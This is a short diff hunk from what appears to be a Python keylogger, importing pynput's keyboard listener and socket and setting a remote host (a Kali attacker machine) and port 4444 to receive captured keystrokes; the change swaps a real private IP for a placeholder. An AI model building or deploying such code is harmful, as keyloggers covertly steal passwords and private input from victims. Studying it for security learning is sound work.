@@ -3,7 +3,7 @@ from pynput.keyboard import Key, Listener
 import socket
 
 # Specify remote server details
-REMOTE_HOST = '192.168.0.101'  # Replace with your Kali machine's IP
+REMOTE_HOST = '192.168.x.x'  # Replace with your Kali machine's IP
 REMOTE_PORT = 4444
 
 # Global variable for socket
